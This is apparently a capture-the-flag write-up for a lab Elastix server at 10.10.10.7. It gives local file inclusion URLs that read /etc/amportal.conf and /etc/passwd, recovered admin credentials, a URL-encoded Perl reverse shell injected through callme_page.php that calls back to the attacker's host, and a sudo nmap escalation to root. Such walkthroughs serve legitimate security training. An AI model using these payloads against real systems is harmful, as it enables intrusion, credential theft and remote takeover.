# Writeup 
## Recon 
- Used nmapAutomator.sh (recon scan type)

![003c85c24050f8e2bdacb3367cdc482e.png](../../_resources/003c85c24050f8e2bdacb3367cdc482e-1.png)

- Elastix on https://10.10.10.7
- Webmin on https://10.10.10.7:10000

- Found Local File Inclusion vulnerability on Google https://www.exploit-db.com/exploits/37637

- Navigated to exploit URL

```txt
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

![c7d75189bf67fbfd16f58f35940769dc.png](../../_resources/c7d75189bf67fbfd16f58f35940769dc-1.png)

- Interesting tidbits from the output, possible passwords are: 
	- amp109
	- amp111
	- jEhdIekWmdjE
	- passw0rd
- Possible users are: 
	- admin
	- asteriskuser
- After a little bit of manual testing, valid credentials are: 
	- admin:jEhdIekWmdjE

![7d8cca287d1cd6bf158d231739de4ee7.png](../../_resources/7d8cca287d1cd6bf158d231739de4ee7-1.png)

![85a3092a41d9ed7622a969124d8b97f0.png](../../_resources/85a3092a41d9ed7622a969124d8b97f0-1.png)

- /etc/passwd file (found fanis user among others)

```txt
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

![aabbc8bd3940d8fd3df27af0177babcf.png](../../_resources/aabbc8bd3940d8fd3df27af0177babcf-1.png)

- User flag done! (navigated to /home/fanis/user.txt)

```txt
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&module=Accounts&action
```

![2a9fcc764b055818b24b2415e071e593.png](../../_resources/2a9fcc764b055818b24b2415e071e593-1.png)


## Initial Access

- Using the admin:jEhdIekWmdjE credentials allows access to the web app for further investigation.

![fc310f1785022599c819e71889e7764f.png](../../_resources/fc310f1785022599c819e71889e7764f-1.png)

- In particular, the PBX tab is most interesting because of another exploit that allows potential RCE and privilege escalation through the module... https://www.exploit-db.com/exploits/18650

![2d5fdf7e4327abd1d0b3a0326ffe2502.png](../../_resources/2d5fdf7e4327abd1d0b3a0326ffe2502-1.png)

- An extension of <233> is available looking at the PBX tab

![1588e631223f0f853d0739d24376bbdc.png](../../_resources/1588e631223f0f853d0739d24376bbdc-1.png)

- All that is left is to navigate to the URL, making sure to inject the proper parameters as needed and start a netcat listener beforehand on the appropriate LPORT

```txt
https://[RHOST]/recordings/misc/callme_page.php?action=c&callmenum=[EXT]@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22[LHOST]%3a[LPORT]%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```

```txt
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.6%3a1234%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```

- Initial access complete!

![192fa8fad82e659f335c14d7ad4b3fdc.png](../../_resources/192fa8fad82e659f335c14d7ad4b3fdc-1.png)

## Privilege Escalation

- As per the same exploit-db entry, there should be a privilege escalation trick with nmap to allow root access

```
sudo nmap --interactive
nmap> !sh
```

- Privilege escalation complete!

![d73cf44de2579127cd3c07c6e5c4e0f5.png](../../_resources/d73cf44de2579127cd3c07c6e5c4e0f5-1.png)

- Root flag done!

![a67a0284a73123886ded3ae49fb70ac1.png](../../_resources/a67a0284a73123886ded3ae49fb70ac1-1.png)